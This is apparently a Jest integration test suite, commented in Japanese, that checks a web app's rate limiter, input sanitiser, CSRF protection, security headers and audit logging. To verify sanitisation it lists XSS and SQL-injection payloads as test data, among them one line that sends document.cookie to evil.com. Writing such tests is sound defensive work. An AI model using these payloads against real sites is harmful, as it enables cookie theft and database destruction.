import {
  describe,
  it,
  expect,
  beforeAll,
  afterAll,
  beforeEach,
} from '@jest/globals';
import { createMocks } from 'node-mocks-http';
import { NextRequest, NextResponse } from 'next/server';
import { RateLimiter } from '../../lib/rate-limiter';
import { InputSanitizer, SanitizationType } from '../../lib/input-sanitizer';
import { CSRFProtection } from '../../lib/csrf-protection';
import { validateSecurityHeaders } from '../../lib/security-headers';
import { AuditLogger, AuditAction, AuditLevel } from '../../lib/audit-logger';

describe('セキュリティ統合テスト', () => {
  let rateLimiter: RateLimiter;
  let csrfProtection: CSRFProtection;
  let auditLogger: AuditLogger;

  beforeAll(() => {
    // テスト用インスタンスの作成
    rateLimiter = new RateLimiter({
      windowMs: 60 * 1000,
      maxRequests: 5,
      message: 'Test rate limit exceeded',
    });

    csrfProtection = new CSRFProtection({
      tokenLength: 32,
      tokenExpiry: 30 * 60 * 1000,
    });

    auditLogger = new AuditLogger({
      mongoUri: process.env.MONGODB_URI || 'mongodb://localhost:27017',
      databaseName: 'test_audit_db',
      collectionName: 'test_audit_logs',
    });
  });

  afterAll(async () => {
    // クリーンアップ
  });

  describe('レート制限テスト', () => {
    beforeEach(() => {
      // 各テスト前にレート制限をリセット
      rateLimiter.resetIP('127.0.0.1');
    });

    it('正常なリクエスト数では許可される', () => {
      for (let i = 0; i < 5; i++) {
        const result = rateLimiter.checkLimit('127.0.0.1');
        expect(result.allowed).toBe(true);
        expect(result.remaining).toBe(4 - i);
      }
    });

    it('制限を超えるとブロックされる', () => {
      // 制限数まで消費
      for (let i = 0; i < 5; i++) {
        rateLimiter.checkLimit('127.0.0.1');
      }

      // 制限超過
      const result = rateLimiter.checkLimit('127.0.0.1');
      expect(result.allowed).toBe(false);
      expect(result.remaining).toBe(0);
      expect(result.blocked).toBe(true);
    });

    it('異なるIPでは独立して制限される', () => {
      // IP1で制限まで消費
      for (let i = 0; i < 5; i++) {
        rateLimiter.checkLimit('192.168.1.1');
      }
      const resultIP1 = rateLimiter.checkLimit('192.168.1.1');
      expect(resultIP1.allowed).toBe(false);

      // IP2は正常
      const resultIP2 = rateLimiter.checkLimit('192.168.1.2');
      expect(resultIP2.allowed).toBe(true);
    });
  });

  describe('入力サニタイゼーションテスト', () => {
    it('XSS攻撃パターンがエスケープされる', () => {
      const maliciousInputs = [
        '<script>alert("xss")</script>',
        '<img src="x" onerror="alert(1)">',
        'javascript:alert(1)',
        '<iframe src="javascript:alert(1)"></iframe>',
        '<svg onload="alert(1)">',
        '"><script>alert(1)</script>',
        '\'"--;!\\x3cscript\\x3ealert(1)\\x3c/script\\x3e=',
      ];

      maliciousInputs.forEach((input) => {
        const sanitized = InputSanitizer.sanitize(input, {
          type: SanitizationType.STRICT,
        });

        expect(sanitized).not.toContain('<script');
        expect(sanitized).not.toContain('javascript:');
        expect(sanitized).not.toContain('onerror');
        expect(sanitized).not.toContain('onload');
        expect(sanitized).not.toContain('<iframe');
        expect(sanitized).not.toContain('<svg');
      });
    });

    it('SQLインジェクション攻撃パターンが検出される', () => {
      const sqlInjectionInputs = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "1' UNION SELECT * FROM users--",
        "'; DELETE FROM posts WHERE '1'='1",
      ];

      sqlInjectionInputs.forEach((input) => {
        const sanitized = InputSanitizer.sanitize(input, {
          type: SanitizationType.STRICT,
        });

        expect(sanitized).not.toContain('DROP TABLE');
        expect(sanitized).not.toContain('UNION SELECT');
        expect(sanitized).not.toContain('DELETE FROM');
        expect(sanitized).toContain('&'); // HTMLエンティティエスケープされている
      });
    });

    it('正常な入力は適切に処理される', () => {
      const validInputs = {
        username: 'user123',
        email: 'test@example.com',
        content: 'これは正常な投稿内容です。',
        url: 'https://example.com',
      };

      const configs = {
        username: { type: SanitizationType.USERNAME, maxLength: 50 },
        email: { type: SanitizationType.EMAIL, maxLength: 254 },
        content: { type: SanitizationType.POST_CONTENT, maxLength: 1000 },
        url: { type: SanitizationType.URL, maxLength: 2048 },
      };

      const result = InputSanitizer.sanitizeBatch(validInputs, configs);

      expect(result.username).toBe('user123');
      expect(result.email).toBe('test@example.com');
      expect(result.content).toContain('正常な投稿内容');
      expect(result.url).toBe('https://example.com');
    });
  });

  describe('CSRF保護テスト', () => {
    it('有効なCSRFトークンが生成・検証される', () => {
      const sessionId = 'test-session-123';
      const token = csrfProtection.generateToken(sessionId);

      expect(token).toBeDefined();
      expect(typeof token).toBe('string');
      expect(token.length).toBeGreaterThan(32);

      const isValid = csrfProtection.verifyToken(token, sessionId);
      expect(isValid).toBe(true);
    });

    it('無効なCSRFトークンは拒否される', () => {
      const sessionId = 'test-session-123';
      const validToken = csrfProtection.generateToken(sessionId);

      // 改ざんされたトークン
      const tamperedToken = validToken.slice(0, -1) + 'x';
      expect(csrfProtection.verifyToken(tamperedToken, sessionId)).toBe(false);

      // 異なるセッションID
      const differentSessionId = 'different-session';
      expect(csrfProtection.verifyToken(validToken, differentSessionId)).toBe(
        false
      );

      // 空のトークン
      expect(csrfProtection.verifyToken('', sessionId)).toBe(false);
    });

    it('期限切れトークンは拒否される', async () => {
      // 短い有効期限でテスト用インスタンス作成
      const shortLivedCSRF = new CSRFProtection({
        tokenExpiry: 100, // 100ms
      });

      const sessionId = 'test-session';
      const token = shortLivedCSRF.generateToken(sessionId);

      // 少し待って期限切れにする
      await new Promise((resolve) => setTimeout(resolve, 150));

      const isValid = shortLivedCSRF.verifyToken(token, sessionId);
      expect(isValid).toBe(false);
    });
  });

  describe('セキュリティヘッダーテスト', () => {
    it('セキュリティヘッダーが正しく設定される', () => {
      const validation = validateSecurityHeaders();

      expect(validation.valid).toBe(true);
      expect(validation.errors).toHaveLength(0);
    });

    it('本番環境では厳格な設定が適用される', () => {
      const originalEnv = process.env.NODE_ENV;
      process.env.NODE_ENV = 'production';

      const validation = validateSecurityHeaders();

      // 本番環境では警告があっても正常（unsafe-inlineなど）
      expect(validation.valid).toBe(true);

      process.env.NODE_ENV = originalEnv;
    });
  });

  describe('監査ログテスト', () => {
    it('セキュリティイベントが正しく記録される', async () => {
      const testEvents = [
        {
          action: AuditAction.LOGIN_FAILED,
          level: AuditLevel.WARN,
          ipAddress: '192.168.1.100',
          userAgent: 'Test Browser',
          success: false,
          errorMessage: 'Invalid credentials',
        },
        {
          action: AuditAction.RATE_LIMIT_EXCEEDED,
          level: AuditLevel.WARN,
          ipAddress: '192.168.1.101',
          userAgent: 'Test Browser',
          resource: '/api/posts',
          success: false,
        },
        {
          action: AuditAction.CSRF_VIOLATION,
          level: AuditLevel.ERROR,
          ipAddress: '192.168.1.102',
          userAgent: 'Test Browser',
          resource: '/api/posts',
          success: false,
        },
      ];

      // イベントをログに記録
      for (const event of testEvents) {
        await auditLogger.log(event.action, event);
      }

      // 少し待ってからクエリ
      await new Promise((resolve) => setTimeout(resolve, 100));

      // 記録されたログを検索
      const logs = await auditLogger.search({
        level: AuditLevel.WARN,
        limit: 10,
      });

      expect(logs.length).toBeGreaterThanOrEqual(2);
    });

    it('リスクスコアが正しく計算される', async () => {
      const highRiskEvent = {
        action: AuditAction.XSS_ATTEMPT,
        level: AuditLevel.CRITICAL,
        ipAddress: '192.168.1.200',
        userAgent: 'Malicious Bot',
        success: false,
        details: { attemptedPayload: '<script>alert(1)</script>' },
      };

      await auditLogger.log(highRiskEvent.action, highRiskEvent);

      const logs = await auditLogger.search({
        action: AuditAction.XSS_ATTEMPT,
        limit: 1,
      });

      expect(logs.length).toBe(1);
      expect(logs[0].riskScore).toBeGreaterThanOrEqual(7); // 高リスク
    });
  });

  describe('統合セキュリティテスト', () => {
    it('マルチレイヤーセキュリティが正常に動作する', async () => {
      // 1. レート制限テスト
      const ip = '192.168.1.200';
      let rateLimitResult = rateLimiter.checkLimit(ip);
      expect(rateLimitResult.allowed).toBe(true);

      // 2. CSRF保護テスト
      const sessionId = 'integration-test-session';
      const csrfToken = csrfProtection.generateToken(sessionId);
      expect(csrfProtection.verifyToken(csrfToken, sessionId)).toBe(true);

      // 3. 入力サニタイゼーションテスト
      const userInput = '<script>alert("test")</script>Valid content';
      const sanitized = InputSanitizer.sanitize(userInput, {
        type: SanitizationType.POST_CONTENT,
      });
      expect(sanitized).not.toContain('<script>');
      expect(sanitized).toContain('Valid content');

      // 4. 監査ログ記録テスト
      await auditLogger.log(AuditAction.POST_CREATE, {
        userId: 'user123',
        ipAddress: ip,
        userAgent: 'Integration Test',
        resourceId: 'post456',
        success: true,
      });

      // すべてのセキュリティレイヤーが正常に動作
      expect(true).toBe(true);
    });

    it('攻撃シナリオが適切にブロックされる', async () => {
      const attackerIP = '10.0.0.1';
      const maliciousUserAgent = 'AttackBot/1.0';

      // 1. 大量リクエスト攻撃（レート制限で阻止）
      let blockedAttempts = 0;
      for (let i = 0; i < 10; i++) {
        const result = rateLimiter.checkLimit(attackerIP);
        if (!result.allowed) {
          blockedAttempts++;
        }
      }
      expect(blockedAttempts).toBeGreaterThan(0);

      // 2. XSS攻撃の試行
      const xssPayload =
        '"><script>document.location="http://evil.com?cookie="+document.cookie</script>';
      const sanitizedXSS = InputSanitizer.sanitize(xssPayload, {
        type: SanitizationType.STRICT,
      });
      expect(sanitizedXSS).not.toContain('<script>');
      expect(sanitizedXSS).not.toContain('document.location');

      // 3. CSRF攻撃の試行
      const validToken = csrfProtection.generateToken('legitimate-session');
      const csrfAttack = csrfProtection.verifyToken(
        validToken,
        'attacker-session'
      );
      expect(csrfAttack).toBe(false);

      // 4. 攻撃の監査ログ記録
      await auditLogger.log(AuditAction.SUSPICIOUS_ACTIVITY, {
        level: AuditLevel.CRITICAL,
        ipAddress: attackerIP,
        userAgent: maliciousUserAgent,
        details: {
          attackType: 'multi-vector',
          rateLimitViolations: blockedAttempts,
          xssAttempt: true,
          csrfAttempt: true,
        },
        success: false,
      });

      // 攻撃が記録されたか確認
      const attackLogs = await auditLogger.search({
        ipAddress: attackerIP,
        level: AuditLevel.CRITICAL,
        limit: 1,
      });
      expect(attackLogs.length).toBeGreaterThanOrEqual(1);
    });
  });
});
